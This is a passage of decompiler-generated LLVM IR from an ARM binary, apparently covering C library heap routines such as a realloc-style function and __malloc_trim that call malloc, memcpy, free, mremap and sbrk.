  store i32 %v2_163e4, i32* %r0.global-to-local, align 4
  %v3_163e8 = icmp ult i32 %v2_163e4, %v1_16364
  br i1 %v3_163e8, label %dec_label_pc_16420, label %dec_label_pc_163f0

dec_label_pc_163f0:                               ; preds = %dec_label_pc_163e0
  %v1_163f0 = add i32 %v1_1635c, %v0_16344
  %v2_163f0 = inttoptr i32 %v1_163f0 to i32*
  %v3_163f0 = load i32, i32* %v2_163f0, align 4
  store i32 %v3_163f0, i32* %r1.global-to-local, align 4
  %v1_163f4 = add i32 %v3_163f0, 12
  %v2_163f4 = inttoptr i32 %v1_163f4 to i32*
  %v3_163f4 = load i32, i32* %v2_163f4, align 4
  store i32 %v3_163f4, i32* %r3.global-to-local, align 4
  %v9_163f8 = icmp eq i32 %v3_163f4, %v2_16380
  %v1_163fc = add i32 %v2_16380, 12
  %v2_163fc = inttoptr i32 %v1_163fc to i32*
  %v3_163fc = load i32, i32* %v2_163fc, align 4
  store i32 %v3_163fc, i32* %r2.global-to-local, align 4
  br i1 %v9_163f8, label %dec_label_pc_16404, label %dec_label_pc_16410

dec_label_pc_16404:                               ; preds = %dec_label_pc_163f0
  %v1_16404 = add i32 %v3_163fc, 8
  %v2_16404 = inttoptr i32 %v1_16404 to i32*
  %v3_16404 = load i32, i32* %v2_16404, align 4
  store i32 %v3_16404, i32* %r3.global-to-local, align 4
  %v9_16408 = icmp eq i32 %v3_16404, %v2_16380
  br i1 %v9_16408, label %dec_label_pc_16414, label %dec_label_pc_16410

dec_label_pc_16410:                               ; preds = %dec_label_pc_163f0, %dec_label_pc_16404
  %v0_16410 = call i32 @abort()
  store i32 %v0_16410, i32* %r0.global-to-local, align 4
  %v0_16414.pre = load i32, i32* @r1, align 4
  %v1_16414.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16414

dec_label_pc_16414:                               ; preds = %dec_label_pc_16404, %dec_label_pc_16410
  %v1_16414 = phi i32 [ %v3_163fc, %dec_label_pc_16404 ], [ %v1_16414.pre, %dec_label_pc_16410 ]
  %v0_16414 = phi i32 [ %v3_163f0, %dec_label_pc_16404 ], [ %v0_16414.pre, %dec_label_pc_16410 ]
  %v2_16414 = add i32 %v1_16414, 8
  %v3_16414 = inttoptr i32 %v2_16414 to i32*
  store i32 %v0_16414, i32* %v3_16414, align 4
  %v0_16418 = load i32, i32* %r2.global-to-local, align 4
  %v1_16418 = load i32, i32* %r1.global-to-local, align 4
  %v2_16418 = add i32 %v1_16418, 12
  %v3_16418 = inttoptr i32 %v2_16418 to i32*
  store i32 %v0_16418, i32* %v3_16418, align 4
  %v1_164d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_164d4

dec_label_pc_16420:                               ; preds = %dec_label_pc_16390, %dec_label_pc_163e0, %dec_label_pc_163cc
  %v1_16420 = add i32 %v1_16364, -7
  store i32 %v1_16420, i32* %r0.global-to-local, align 4
  %v1_16424 = call i32 @malloc(i32 %v1_16420)
  store i32 %v1_16424, i32* @r0, align 4
  store i32 %v1_16424, i32* %r1.global-to-local, align 4
  %v2_16428 = icmp eq i32 %v1_16424, 0
  br i1 %v2_16428, label %bb31, label %dec_label_pc_16434

bb31:                                             ; preds = %dec_label_pc_16420
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16608

dec_label_pc_16434:                               ; preds = %dec_label_pc_16420
  %v1_1643c.pre = load i32, i32* @r4, align 4
  %v1_16434 = add i32 %v1_16424, -4
  %v2_16434 = inttoptr i32 %v1_16434 to i32*
  %v3_16434 = load i32, i32* %v2_16434, align 4
  store i32 %v3_16434, i32* @r3, align 4
  %v1_16438 = add i32 %v1_16424, -8
  store i32 %v1_16438, i32* @r7, align 4
  %v9_1643c = icmp eq i32 %v1_16438, %v1_1643c.pre
  br i1 %v9_1643c, label %.thread2, label %dec_label_pc_1644c

.thread2:                                         ; preds = %dec_label_pc_16434
  %v2_16440 = and i32 %v3_16434, -4
  store i32 %v2_16440, i32* %r3.global-to-local, align 4
  %v2_16444 = load i32, i32* @r6, align 4
  %v3_16444 = add i32 %v2_16444, %v2_16440
  store i32 %v3_16444, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_164d4

dec_label_pc_1644c:                               ; preds = %dec_label_pc_16434
  %v0_1644c = load i32, i32* @r6, align 4
  %v1_1644c = add i32 %v0_1644c, -4
  store i32 %v1_1644c, i32* @r2, align 4
  %v3_16450 = udiv i32 %v1_1644c, 4
  store i32 %v3_16450, i32* @ip, align 4
  %tmp37 = and i32 %v1_1644c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_16458 = icmp ult i32 %v1_1644c, 36
  %v3_16458 = or i1 %tmp38, %v2_16458
  %v0_16468 = load i32, i32* @r5, align 4
  br i1 %v3_16458, label %dec_label_pc_16468, label %dec_label_pc_1645c

dec_label_pc_1645c:                               ; preds = %dec_label_pc_1644c
  store i32 %v0_16468, i32* @r1, align 4
  %v0_16460 = call i32 @memcpy()
  store i32 %v0_16460, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_16468:                               ; preds = %dec_label_pc_1644c
  %v1_16468 = inttoptr i32 %v0_16468 to i32*
  %v2_16468 = load i32, i32* %v1_16468, align 4
  store i32 %v2_16468, i32* %r3.global-to-local, align 4
  %v2_1646c = inttoptr i32 %v1_16424 to i32*
  store i32 %v2_16468, i32* %v2_1646c, align 4
  %v0_16470 = load i32, i32* @r5, align 4
  %v1_16470 = add i32 %v0_16470, 4
  %v2_16470 = inttoptr i32 %v1_16470 to i32*
  %v3_16470 = load i32, i32* %v2_16470, align 4
  store i32 %v3_16470, i32* %r3.global-to-local, align 4
  %v1_16474 = load i32, i32* %r1.global-to-local, align 4
  %v2_16474 = add i32 %v1_16474, 4
  %v3_16474 = inttoptr i32 %v2_16474 to i32*
  store i32 %v3_16470, i32* %v3_16474, align 4
  %v0_16478 = load i32, i32* @r5, align 4
  %v1_16478 = add i32 %v0_16478, 8
  %v2_16478 = inttoptr i32 %v1_16478 to i32*
  %v3_16478 = load i32, i32* %v2_16478, align 4
  store i32 %v3_16478, i32* %r3.global-to-local, align 4
  %v0_1647c = load i32, i32* @ip, align 4
  %v1_16480 = load i32, i32* %r1.global-to-local, align 4
  %v2_16480 = add i32 %v1_16480, 8
  %v3_16480 = inttoptr i32 %v2_16480 to i32*
  store i32 %v3_16478, i32* %v3_16480, align 4
  %tmp39 = icmp ult i32 %v0_1647c, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_16488

dec_label_pc_16488:                               ; preds = %dec_label_pc_16468
  %v0_16488 = load i32, i32* @r5, align 4
  %v1_16488 = add i32 %v0_16488, 12
  %v2_16488 = inttoptr i32 %v1_16488 to i32*
  %v3_16488 = load i32, i32* %v2_16488, align 4
  store i32 %v3_16488, i32* %r3.global-to-local, align 4
  %v1_1648c = load i32, i32* %r1.global-to-local, align 4
  %v2_1648c = add i32 %v1_1648c, 12
  %v3_1648c = inttoptr i32 %v2_1648c to i32*
  store i32 %v3_16488, i32* %v3_1648c, align 4
  %v0_16490 = load i32, i32* @r5, align 4
  %v1_16490 = add i32 %v0_16490, 16
  %v2_16490 = inttoptr i32 %v1_16490 to i32*
  %v3_16490 = load i32, i32* %v2_16490, align 4
  store i32 %v3_16490, i32* %r3.global-to-local, align 4
  %v0_16494 = load i32, i32* @ip, align 4
  %v1_16498 = load i32, i32* %r1.global-to-local, align 4
  %v2_16498 = add i32 %v1_16498, 16
  %v3_16498 = inttoptr i32 %v2_16498 to i32*
  store i32 %v3_16490, i32* %v3_16498, align 4
  %tmp40 = icmp ult i32 %v0_16494, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_164a0

dec_label_pc_164a0:                               ; preds = %dec_label_pc_16488
  %v0_164a0 = load i32, i32* @r5, align 4
  %v1_164a0 = add i32 %v0_164a0, 20
  %v2_164a0 = inttoptr i32 %v1_164a0 to i32*
  %v3_164a0 = load i32, i32* %v2_164a0, align 4
  store i32 %v3_164a0, i32* %r3.global-to-local, align 4
  %v1_164a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_164a4 = add i32 %v1_164a4, 20
  %v3_164a4 = inttoptr i32 %v2_164a4 to i32*
  store i32 %v3_164a0, i32* %v3_164a4, align 4
  %v0_164a8 = load i32, i32* @r5, align 4
  %v1_164a8 = add i32 %v0_164a8, 24
  %v2_164a8 = inttoptr i32 %v1_164a8 to i32*
  %v3_164a8 = load i32, i32* %v2_164a8, align 4
  store i32 %v3_164a8, i32* %r3.global-to-local, align 4
  %v1_164ac = load i32, i32* %r1.global-to-local, align 4
  %v2_164ac = add i32 %v1_164ac, 24
  %v3_164ac = inttoptr i32 %v2_164ac to i32*
  store i32 %v3_164a8, i32* %v3_164ac, align 4
  %v0_164b0 = load i32, i32* @ip, align 4
  %v7_164b0 = icmp eq i32 %v0_164b0, 9
  br i1 %v7_164b0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_164a0
  %v1_164b4 = load i32, i32* @r5, align 4
  %v2_164b4 = add i32 %v1_164b4, 28
  %v3_164b4 = inttoptr i32 %v2_164b4 to i32*
  %v4_164b4 = load i32, i32* %v3_164b4, align 4
  store i32 %v4_164b4, i32* %r3.global-to-local, align 4
  %v2_164b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_164b8 = add i32 %v2_164b8, 28
  %v4_164b8 = inttoptr i32 %v3_164b8 to i32*
  store i32 %v4_164b4, i32* %v4_164b8, align 4
  %v1_164bc = load i32, i32* @r5, align 4
  %v2_164bc = add i32 %v1_164bc, 32
  %v3_164bc = inttoptr i32 %v2_164bc to i32*
  %v4_164bc = load i32, i32* %v3_164bc, align 4
  store i32 %v4_164bc, i32* %r3.global-to-local, align 4
  %v2_164c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_164c0 = add i32 %v2_164c0, 32
  %v4_164c0 = inttoptr i32 %v3_164c0 to i32*
  store i32 %v4_164bc, i32* %v4_164c0, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_164a0, %dec_label_pc_16488, %dec_label_pc_16468, %dec_label_pc_1645c, %bb32
  %v0_164c4 = load i32, i32* @r5, align 4
  store i32 %v0_164c4, i32* @r0, align 4
  %v0_164c8 = call i32 @free()
  store i32 %v0_164c8, i32* %r0.global-to-local, align 4
  %v0_164cc = load i32, i32* @r7, align 4
  %v1_164cc = add i32 %v0_164cc, 8
  store i32 %v1_164cc, i32* @r4, align 4
  br label %dec_label_pc_16608

dec_label_pc_164d4:                               ; preds = %bb30, %.thread2, %dec_label_pc_16414
  %v0_164e8 = phi i32 [ %v3_16444, %.thread2 ], [ %v1_1635c, %bb30 ], [ %v1_164d4.pre, %dec_label_pc_16414 ]
  %v0_164d4 = load i32, i32* @sb, align 4
  %v2_164d4 = sub i32 %v0_164e8, %v0_164d4
  store i32 %v2_164d4, i32* %r1.global-to-local, align 4
  %v0_164dc = load i32, i32* @sl, align 4
  %v1_164dc = add i32 %v0_164dc, 4
  %v2_164dc = inttoptr i32 %v1_164dc to i32*
  %v3_164dc = load i32, i32* %v2_164dc, align 4
  %tmp41 = icmp ugt i32 %v2_164d4, 15
  %v1_16504 = urem i32 %v3_164dc, 2
  store i32 %v1_16504, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_16504, label %dec_label_pc_164e4

dec_label_pc_164e4:                               ; preds = %dec_label_pc_164d4
  %v2_164e8 = or i32 %v1_16504, %v0_164e8
  store i32 %v2_164e8, i32* %r3.global-to-local, align 4
  store i32 %v2_164e8, i32* %v2_164dc, align 4
  %v0_164f0 = load i32, i32* @sl, align 4
  %v1_164f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_164f0 = add i32 %v1_164f0, %v0_164f0
  store i32 %v2_164f0, i32* %r2.global-to-local, align 4
  %v1_164f4 = add i32 %v2_164f0, 4
  %v2_164f4 = inttoptr i32 %v1_164f4 to i32*
  %v3_164f4 = load i32, i32* %v2_164f4, align 4
  %v1_164f8 = or i32 %v3_164f4, 1
  store i32 %v1_164f8, i32* %r3.global-to-local, align 4
  store i32 %v1_164f8, i32* %v2_164f4, align 4
  br label %dec_label_pc_16534

dec_label_pc_16504:                               ; preds = %dec_label_pc_164d4
  %v2_16508 = add i32 %v0_164dc, %v0_164d4
  store i32 %v2_16508, i32* %r0.global-to-local, align 4
  %v2_1650c = or i32 %v1_16504, %v0_164d4
  store i32 %v2_1650c, i32* %r3.global-to-local, align 4
  %v1_16510 = or i32 %v2_164d4, 1
  store i32 %v1_16510, i32* %r2.global-to-local, align 4
  store i32 %v2_1650c, i32* %v2_164dc, align 4
  %v0_16518 = load i32, i32* %r2.global-to-local, align 4
  %v1_16518 = load i32, i32* %r0.global-to-local, align 4
  %v2_16518 = add i32 %v1_16518, 4
  %v3_16518 = inttoptr i32 %v2_16518 to i32*
  store i32 %v0_16518, i32* %v3_16518, align 4
  %v0_1651c = load i32, i32* %r0.global-to-local, align 4
  %v1_1651c = load i32, i32* %r1.global-to-local, align 4
  %v2_1651c = add i32 %v1_1651c, %v0_1651c
  store i32 %v2_1651c, i32* %r2.global-to-local, align 4
  %v1_16520 = add i32 %v2_1651c, 4
  %v2_16520 = inttoptr i32 %v1_16520 to i32*
  %v3_16520 = load i32, i32* %v2_16520, align 4
  %v1_16524 = or i32 %v3_16520, 1
  store i32 %v1_16524, i32* %r3.global-to-local, align 4
  store i32 %v1_16524, i32* %v2_16520, align 4
  %v0_1652c = load i32, i32* %r0.global-to-local, align 4
  %v1_1652c = add i32 %v0_1652c, 8
  store i32 %v1_1652c, i32* @r0, align 4
  %v0_16530 = call i32 @free()
  store i32 %v0_16530, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16534

dec_label_pc_16534:                               ; preds = %dec_label_pc_164e4, %dec_label_pc_16504
  %v0_16534 = load i32, i32* @sl, align 4
  %v1_16534 = add i32 %v0_16534, 8
  store i32 %v1_16534, i32* @r4, align 4
  br label %dec_label_pc_16608

dec_label_pc_1653c:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r1.global-to-local, align 4
  %v4_16544 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_16544, i32* @r8, align 4
  %v2_16548 = inttoptr i32 %v1_16358 to i32*
  %v3_16548 = load i32, i32* %v2_16548, align 4
  store i32 %v3_16548, i32* @r4, align 4
  %v1_1654c = add i32 %v4_16544, 860
  %v2_1654c = inttoptr i32 %v1_1654c to i32*
  %v3_1654c = load i32, i32* %v2_1654c, align 4
  %v1_16550 = add i32 %v3_16548, 4
  %v1_16554 = add i32 %v3_1654c, -1
  store i32 %v1_16554, i32* %r2.global-to-local, align 4
  %v2_16558 = add i32 %v1_16550, %v1_16554
  %v1_1655c = load i32, i32* @sb, align 4
  %v2_1655c = add i32 %v2_16558, %v1_1655c
  store i32 %v2_1655c, i32* %r3.global-to-local, align 4
  %v2_16560 = sub i32 0, %v3_1654c
  %v3_16560 = and i32 %v2_1655c, %v2_16560
  store i32 %v3_16560, i32* @r7, align 4
  %v2_16564 = sub i32 %v3_16560, %v3_16548
  store i32 %v2_16564, i32* @fp, align 4
  %v9_16568 = icmp eq i32 %v1_1635c, %v2_16564
  br i1 %v9_16568, label %dec_label_pc_165dc, label %dec_label_pc_16570

dec_label_pc_16570:                               ; preds = %dec_label_pc_1653c
  %v2_16570 = sub i32 %v1_16358, %v3_16548
  store i32 %v2_16570, i32* %r0.global-to-local, align 4
  %v2_16574 = add i32 %v3_16548, %v1_1635c
  store i32 %v2_16574, i32* %r1.global-to-local, align 4
  store i32 %v3_16560, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_16580 = call i32 @mremap(i32 %v2_16570, i32 %v2_16574, i32 %v3_16560, i32 1)
  store i32 %v4_16580, i32* %r0.global-to-local, align 4
  %v7_16584 = icmp eq i32 %v4_16580, -1
  br i1 %v7_16584, label %dec_label_pc_165d0, label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %dec_label_pc_16570
  %v1_1658c = load i32, i32* @r4, align 4
  %v2_1658c = add i32 %v1_1658c, %v4_16580
  store i32 %v2_1658c, i32* %r0.global-to-local, align 4
  %v0_16590 = load i32, i32* @fp, align 4
  %v1_16590 = or i32 %v0_16590, 2
  store i32 %v1_16590, i32* %r3.global-to-local, align 4
  %v2_16594 = add i32 %v2_1658c, 4
  %v3_16594 = inttoptr i32 %v2_16594 to i32*
  store i32 %v1_16590, i32* %v3_16594, align 4
  %v0_16598 = load i32, i32* @r8, align 4
  %v1_16598 = add i32 %v0_16598, 868
  %v2_16598 = inttoptr i32 %v1_16598 to i32*
  %v3_16598 = load i32, i32* %v2_16598, align 4
  store i32 %v3_16598, i32* %r3.global-to-local, align 4
  %v1_1659c = add i32 %v0_16598, 880
  %v2_1659c = inttoptr i32 %v1_1659c to i32*
  %v3_1659c = load i32, i32* %v2_1659c, align 4
  store i32 %v3_1659c, i32* %r2.global-to-local, align 4
  %v0_165a0 = load i32, i32* @r6, align 4
  %v2_165a0 = sub i32 %v3_16598, %v0_165a0
  store i32 %v2_165a0, i32* %r3.global-to-local, align 4
  %v1_165a4 = load i32, i32* @r7, align 4
  %v2_165a4 = add i32 %v1_165a4, %v2_165a0
  store i32 %v2_165a4, i32* %r1.global-to-local, align 4
  %v1_165a8 = add i32 %v0_16598, 872
  %v2_165a8 = inttoptr i32 %v1_165a8 to i32*
  %v3_165a8 = load i32, i32* %v2_165a8, align 4
  store i32 %v3_165a8, i32* %r3.global-to-local, align 4
  %v1_165b0 = add i32 %v0_16598, 884
  %v2_165b0 = inttoptr i32 %v1_165b0 to i32*
  %v3_165b0 = load i32, i32* %v2_165b0, align 4
  store i32 %v3_165b0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_165a4, %v3_1659c
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_1658c
  store i32 %v2_165a4, i32* %v2_1659c, align 4
  %v0_165b8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_165b8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_1658c, %bb33
  %v1_165b8 = phi i32 [ %v0_16598, %dec_label_pc_1658c ], [ %v1_165b8.pre, %bb33 ]
  %v0_165b8 = phi i32 [ %v2_165a4, %dec_label_pc_1658c ], [ %v0_165b8.pre, %bb33 ]
  %v2_165b8 = add i32 %v1_165b8, 868
  %v3_165b8 = inttoptr i32 %v2_165b8 to i32*
  store i32 %v0_165b8, i32* %v3_165b8, align 4
  %v0_165bc = load i32, i32* %r1.global-to-local, align 4
  %v1_165bc = load i32, i32* %r3.global-to-local, align 4
  %v2_165bc = add i32 %v1_165bc, %v0_165bc
  store i32 %v2_165bc, i32* %r1.global-to-local, align 4
  %v1_165c0 = load i32, i32* %r2.global-to-local, align 4
  %v0_165c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_165c4 = add i32 %v0_165c4, 8
  store i32 %v1_165c4, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_165bc, %v1_165c0
  br i1 %tmp43, label %bb35, label %dec_label_pc_16608

bb35:                                             ; preds = %bb34
  %v5_165c8 = load i32, i32* @r8, align 4
  %v6_165c8 = add i32 %v5_165c8, 884
  %v7_165c8 = inttoptr i32 %v6_165c8 to i32*
  store i32 %v2_165bc, i32* %v7_165c8, align 4
  br label %dec_label_pc_16608

dec_label_pc_165d0:                               ; preds = %dec_label_pc_16570
  %v0_165d0 = load i32, i32* @sb, align 4
  %v1_165d0 = add i32 %v0_165d0, 4
  store i32 %v1_165d0, i32* %r3.global-to-local, align 4
  %v0_165d4 = load i32, i32* @r6, align 4
  %v3_165d4 = icmp ult i32 %v0_165d4, %v1_165d0
  br i1 %v3_165d4, label %dec_label_pc_165e4, label %dec_label_pc_165d0.dec_label_pc_165dc_crit_edge

dec_label_pc_165d0.dec_label_pc_165dc_crit_edge:  ; preds = %dec_label_pc_165d0
  %v0_165dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_165dc

dec_label_pc_165dc:                               ; preds = %dec_label_pc_165d0.dec_label_pc_165dc_crit_edge, %dec_label_pc_1653c
  %v0_165dc = phi i32 [ %v0_165dc.pre, %dec_label_pc_165d0.dec_label_pc_165dc_crit_edge ], [ %v0_16344, %dec_label_pc_1653c ]
  store i32 %v0_165dc, i32* @r4, align 4
  br label %dec_label_pc_16608

dec_label_pc_165e4:                               ; preds = %dec_label_pc_165d0
  %v1_165e4 = add i32 %v0_165d0, -7
  store i32 %v1_165e4, i32* %r0.global-to-local, align 4
  %v1_165e8 = call i32 @malloc(i32 %v1_165e4)
  store i32 %v1_165e8, i32* @r0, align 4
  store i32 %v1_165e8, i32* @r4, align 4
  %v2_165ec = icmp eq i32 %v1_165e8, 0
  br i1 %v2_165ec, label %dec_label_pc_16608, label %dec_label_pc_165f4

dec_label_pc_165f4:                               ; preds = %dec_label_pc_165e4
  %v0_165f4 = load i32, i32* @r6, align 4
  %v1_165f4 = add i32 %v0_165f4, -8
  store i32 %v1_165f4, i32* @r2, align 4
  %v0_165f8 = load i32, i32* @r5, align 4
  store i32 %v0_165f8, i32* @r1, align 4
  %v0_165fc = call i32 @memcpy()
  %v0_16600 = load i32, i32* @r5, align 4
  store i32 %v0_16600, i32* @r0, align 4
  %v0_16604 = call i32 @free()
  store i32 %v0_16604, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16608

dec_label_pc_16608:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_165e4, %dec_label_pc_165dc, %dec_label_pc_16534, %.thread6, %dec_label_pc_163a4, %dec_label_pc_165f4
  store i32 %v2_162f8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  %v4_16618 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 24) to i32*), align 4
  store i32 %v4_16618, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_16618)
  br label %dec_label_pc_16624

dec_label_pc_16624:                               ; preds = %dec_label_pc_1632c, %dec_label_pc_162d4, %dec_label_pc_162bc, %dec_label_pc_16608
  %v0_16624 = load i32, i32* @r4, align 4
  store i32 %v0_16624, i32* %r0.global-to-local, align 4
  store i32 %v3_1629c, i32* @r4, align 4
  store i32 %v6_1629c, i32* @r5, align 4
  store i32 %v9_1629c, i32* @r6, align 4
  store i32 %v12_1629c, i32* @r7, align 4
  store i32 %v15_1629c, i32* @r8, align 4
  store i32 %v18_1629c, i32* @sb, align 4
  store i32 %v21_1629c, i32* @sl, align 4
  store i32 %v24_1629c, i32* @fp, align 4
  store i32 %v27_1629c, i32* @lr, align 4
  ret i32 %v0_16624

; uselistorder directives
  uselistorder i32 %v2_165bc, { 1, 0, 2 }
  uselistorder i32 %v2_165a4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_16580, { 1, 0, 2 }
  uselistorder i32 %v3_16560, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16504, { 2, 1, 0 }
  uselistorder i32 %v2_164d4, { 1, 0, 2 }
  uselistorder i32 %v0_16468, { 1, 0 }
  uselistorder i32 %v1_16424, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_16388, { 0, 2, 1, 3 }
  uselistorder i32 %v2_16380, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_16364, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1635c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_16358, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_16348, { 1, 0 }
  uselistorder i32 %v0_16344, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_16324, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_16624, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16608, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_16534, { 1, 0 }
  uselistorder label %dec_label_pc_164d4, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_16420, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16414, { 1, 0 }
  uselistorder label %dec_label_pc_16410, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_16638(i32 %arg1) local_unnamed_addr {
dec_label_pc_16638:
  %v0_16638 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16638, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16638
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16638, %bb
  %v10_1664c = phi i32 [ %arg1, %dec_label_pc_16638 ], [ 0, %bb ]
  ret i32 %v10_1664c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_16650 = add i32 %arg2, 44
  %v2_16650 = inttoptr i32 %v1_16650 to i32*
  %v3_16650 = load i32, i32* %v2_16650, align 4
  %v12_16654 = load i32, i32* @r7, align 4
  %v1_16658 = add i32 %v3_16650, 4
  %v2_16658 = inttoptr i32 %v1_16658 to i32*
  %v3_16658 = load i32, i32* %v2_16658, align 4
  %v1_1665c = add i32 %arg2, 860
  %v2_1665c = inttoptr i32 %v1_1665c to i32*
  %v3_1665c = load i32, i32* %v2_1665c, align 4
  store i32 %v3_1665c, i32* @r4, align 4
  %v1_16660 = and i32 %v3_16658, -4
  store i32 %v1_16660, i32* @r6, align 4
  %v1_16664 = add i32 %v1_16660, -17
  %v2_16668 = add i32 %v1_16664, %v3_1665c
  store i32 %arg2, i32* @r5, align 4
  %v2_16674 = sub i32 %v2_16668, %arg1
  store i32 %v3_1665c, i32* %r1.global-to-local, align 4
  %v2_1667c = udiv i32 %v2_16674, %v3_1665c
  %v1_16680 = add i32 %v2_1667c, -1
  store i32 %v1_16680, i32* %r0.global-to-local, align 4
  %v2_16684 = mul i32 %v1_16680, %v3_1665c
  store i32 %v2_16684, i32* @r7, align 4
  %v2_16688 = icmp eq i32 %v2_16684, 0
  store i1 %v2_16688, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_16684, 1
  br i1 %tmp8, label %dec_label_pc_166f0, label %dec_label_pc_16690

dec_label_pc_16690:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16694 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16694, i32* %r0.global-to-local, align 4
  %v0_16698 = load i32, i32* @r5, align 4
  %v1_16698 = add i32 %v0_16698, 44
  %v2_16698 = inttoptr i32 %v1_16698 to i32*
  %v3_16698 = load i32, i32* %v2_16698, align 4
  %v0_1669c = load i32, i32* @r6, align 4
  %v2_1669c = add i32 %v0_1669c, %v3_16698
  %v9_166a0 = icmp eq i32 %v1_16694, %v2_1669c
  store i1 %v9_166a0, i1* @cpsr_z, align 1
  store i32 %v1_16694, i32* @r4, align 4
  br i1 %v9_166a0, label %dec_label_pc_166ac, label %dec_label_pc_166f0

dec_label_pc_166ac:                               ; preds = %dec_label_pc_16690
  %v0_166ac = load i32, i32* @r7, align 4
  %v1_166ac = sub i32 0, %v0_166ac
  store i32 %v1_166ac, i32* %r0.global-to-local, align 4
  %v1_166b0 = call i32 @__GI_sbrk(i32 %v1_166ac)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_166b8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_166b8, i32* %r0.global-to-local, align 4
  %v7_166bc = icmp eq i32 %v1_166b8, -1
  store i1 %v7_166bc, i1* @cpsr_z, align 1
  br i1 %v7_166bc, label %dec_label_pc_166f0, label %dec_label_pc_166c4

dec_label_pc_166c4:                               ; preds = %dec_label_pc_166ac
  %v0_166c4 = load i32, i32* @r4, align 4
  %v2_166c4 = sub i32 %v0_166c4, %v1_166b8
  store i32 %v2_166c4, i32* %r0.global-to-local, align 4
  %v9_166c4 = icmp eq i32 %v0_166c4, %v1_166b8
  store i1 %v9_166c4, i1* @cpsr_z, align 1
  br i1 %v9_166c4, label %dec_label_pc_166f0, label %dec_label_pc_166cc

dec_label_pc_166cc:                               ; preds = %dec_label_pc_166c4
  %v0_166cc = load i32, i32* @r5, align 4
  %v1_166cc = add i32 %v0_166cc, 872
  %v2_166cc = inttoptr i32 %v1_166cc to i32*
